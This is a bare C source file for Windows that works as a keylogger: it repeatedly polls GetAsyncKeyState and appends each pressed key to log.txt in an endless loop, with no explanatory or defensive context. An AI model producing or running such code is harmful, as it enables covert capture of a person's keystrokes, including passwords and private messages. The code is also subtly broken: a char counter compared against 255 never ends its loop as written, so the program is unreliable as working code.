#include <stdio.h>
#include <windows.h>

int main() {
    char key;
    while (1) {
        for (key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                FILE *file = fopen("log.txt", "a+");
                if (file != NULL) {
                    fprintf(file, "%c", key);
                    fclose(file);
                }
            }
        }
    }
    return 0;
}
